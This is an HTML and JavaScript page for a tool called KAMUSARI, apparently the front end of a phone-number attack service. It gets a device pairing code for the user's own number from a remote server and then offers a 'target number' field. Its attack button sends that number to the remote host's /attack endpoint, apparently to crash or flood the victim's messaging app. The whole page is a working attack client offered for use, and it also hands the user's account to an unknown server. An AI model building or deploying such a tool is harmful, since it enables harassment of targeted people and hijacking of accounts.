<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KAMUSARI SYSTEM</title>
    <style>
        :root {
            --primary: #ff0000;
            --secondary: #00ff00;
            --dark: #000000;
            --pink: #ff007f;
            --blue: #0000ff;
        }

        body {
            background-color: var(--dark); /* سوداء تماماً */
            color: white;
            font-family: 'Arial', sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        /* عنوان KAMUSARI علوي وكبير */
        .header-text {
            color: var(--primary);
            font-size: 50px;
            font-weight: bold;
            text-shadow: 0 0 20px var(--primary), 0 0 40px var(--primary);
            margin-bottom: 20px;
            font-family: 'Times New Roman', serif;
        }

        /* الحاوية الرئيسية - قريبة من الشاشة وكبيرة */
        .main-card {
            width: 95%;
            max-width: 500px;
            border: 4px solid var(--primary);
            background: #0a0a0a;
            border-radius: 20px;
            padding: 40px 20px;
            box-shadow: 0 0 50px var(--primary); /* إشعاع قوي جداً */
            text-align: center;
            position: relative;
        }

        /* العنوان الأخضر (ENTER YOUR NUMBER) */
        .label-green {
            background: var(--secondary);
            color: black;
            font-weight: bold;
            padding: 12px 30px;
            font-size: 20px;
            display: inline-block;
            border-radius: 8px;
            box-shadow: 0 0 20px var(--secondary);
            margin-bottom: 30px;
        }

        /* الإطار الأبيض الداخلي المشع */
        .white-frame {
            border: 3px solid #ffffff;
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 0 25px #ffffff;
            margin-bottom: 30px;
        }

        /* حقل الإدخال الوردي */
        input {
            width: 90%;
            padding: 18px;
            background: var(--pink);
            border: none;
            color: white;
            font-size: 22px;
            font-weight: bold;
            text-align: center;
            border-radius: 10px;
            box-shadow: 0 0 20px var(--pink);
            outline: none;
        }

        /* إطار الكود الصغير */
        .code-display {
            border: 2px dashed #fff;
            padding: 15px;
            margin-top: 15px;
            font-size: 24px;
            color: var(--secondary);
            display: none;
            background: rgba(255,255,255,0.05);
        }

        /* الأزرار المستقيمة */
        .btn {
            width: 100%;
            padding: 20px;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 5px; /* مستقيمة تقريباً */
            cursor: pointer;
            text-transform: uppercase;
            transition: 0.3s;
            margin-top: 10px;
        }

        .btn-link { background: #fff; color: #000; box-shadow: 0 0 15px #fff; }
        .btn-attack { 
            background: var(--primary); 
            color: white; 
            box-shadow: 0 0 25px var(--primary);
            border: 2px solid #fff;
        }

        /* العلامة الزرقاء بالأسفل */
        .made-by {
            background: var(--blue);
            color: white;
            padding: 10px 25px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 5px;
            box-shadow: 0 0 20px var(--blue);
            margin-top: 40px;
        }

        .hidden { display: none; }

    </style>
</head>
<body>

    <div class="header-text">𝑲𝑨𝑳𝑴𝑺𝑨𝑹𝑰</div>

    <div id="section-link" class="main-card">
        <div class="label-green">ENTER YOUR NUMBER</div>
        
        <div class="white-frame">
            <input type="text" id="myNumber" placeholder="212xxxxxxxx">
            <div id="displayCode" class="code-display"></div>
        </div>

        <button class="btn btn-link" onclick="getPairingCode()">طلب كود الربط</button>
    </div>

    <div id="section-attack" class="main-card hidden">
        <div class="label-green" style="background: var(--primary); color: white; box-shadow: 0 0 20px var(--primary);">TARGET NUMBER</div>
        
        <div class="white-frame" style="box-shadow: 0 0 25px var(--primary);">
            <input type="text" id="targetNumber" placeholder="Target 212xxxx" style="background: #330000; border: 1px solid var(--primary);">
        </div>

        <button class="btn btn-attack" onclick="launchAttack()">
            FUCK THIS NUMBER BY KAMUSARI 🗡️🔥
        </button>
    </div>

    <div class="made-by">𝑴𝑨𝑫𝑬 𝑩𝒀 𝑺𝑰𝑹 𝑺𝑯𝑨𝑵𝑲𝑺</div>

    <script>
        const API = "https://yasonuak-chrash-001.hf.space";

        // فحص الذاكرة عند فتح الصفحة
        if(localStorage.getItem('connected') === 'true') {
            switchToAttack();
        }

        function switchToAttack() {
            document.getElementById('section-link').classList.add('hidden');
            document.getElementById('section-attack').classList.remove('hidden');
        }

        async function getPairingCode() {
            const num = document.getElementById('myNumber').value;
            if(!num) return;
            
            const codeBox = document.getElementById('displayCode');
            codeBox.style.display = "block";
            codeBox.innerText = "جاري الاتصال...";

            try {
                const res = await fetch(`${API}/get-code?phone=${num}`);
                const data = await res.json();
                if(data.code) {
                    codeBox.innerText = data.code;
                    // محاكاة التحقق من الربط
                    setTimeout(() => {
                        localStorage.setItem('connected', 'true');
                        switchToAttack();
                    }, 10000);
                }
            } catch(e) { codeBox.innerText = "خطأ في السيرفر"; }
        }

        async function launchAttack() {
            const target = document.getElementById('targetNumber').value;
            if(!target) return;
            alert("KAMUSARI IS ON THE WAY!");
            fetch(`${API}/attack?target=${target}`);
        }
    </script>
</body>
</html>
